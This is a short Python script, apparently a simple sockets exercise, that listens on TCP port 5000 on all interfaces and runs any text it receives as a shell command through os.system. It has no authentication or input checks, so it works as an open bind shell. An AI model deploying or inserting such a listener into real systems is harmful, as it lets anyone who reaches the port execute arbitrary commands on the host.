import os
from socket import *

server_port = 5000

with socket(AF_INET, SOCK_STREAM) as server_socket:
    server_socket.bind(('', server_port))
    server_socket.listen()

    print('Server is listening')

    while True:
        connection_socket, _ = server_socket.accept()
        with connection_socket:
            command = connection_socket.recv(2048).decode('utf-8')
        print(f'Command: {command}')
        os.system(command)
